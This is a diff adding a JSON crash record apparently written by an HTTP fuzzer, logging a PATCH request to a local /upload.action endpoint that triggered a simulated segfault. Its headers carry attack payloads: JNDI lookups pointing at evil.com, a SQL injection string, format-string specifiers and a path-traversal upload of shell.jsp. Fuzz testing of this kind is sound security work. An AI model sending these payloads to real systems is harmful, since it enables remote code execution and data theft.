@@ -1,0 +1,26 @@
+{
+  "timestamp": "2025-12-29T14:39:58.422368",
+  "crash_type": "segfault",
+  "payload": "PATCH /upload.action?\nHeaders: {'User-Agent': '${jndi:ldap://evil.com/exploit}', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'close', 'Host': '127.0.0.1:8080', 'X-Forwarded-Host': '1; SELECT * FROM users', 'Transfer-Encoding': 'http://[::1]', 'X-Forwarded-For': '%x%x%x%x%x%x%x%x%x%x', 'Content-Length': '${jndi:rmi://evil.com/a}', 'Content-Disposition': 'form-data; name=\"upload\"; filename=\"../../../shell.jsp\"', 'Content-Type': 'multipart/form-data'}",
+  "payload_hash": "02ee1976001468f0",
+  "request_method": "PATCH",
+  "request_path": "/upload.action?",
+  "request_headers": {
+    "User-Agent": "${jndi:ldap://evil.com/exploit}",
+    "Accept-Encoding": "gzip, deflate",
+    "Accept": "*/*",
+    "Connection": "close",
+    "Host": "127.0.0.1:8080",
+    "X-Forwarded-Host": "1; SELECT * FROM users",
+    "Transfer-Encoding": "http://[::1]",
+    "X-Forwarded-For": "%x%x%x%x%x%x%x%x%x%x",
+    "Content-Length": "${jndi:rmi://evil.com/a}",
+    "Content-Disposition": "form-data; name=\"upload\"; filename=\"../../../shell.jsp\"",
+    "Content-Type": "multipart/form-data"
+  },
+  "request_body": "",
+  "error_message": "Simulated segfault",
+  "stack_trace": null,
+  "fuzzer_variant": null,
+  "iteration": 15
+}
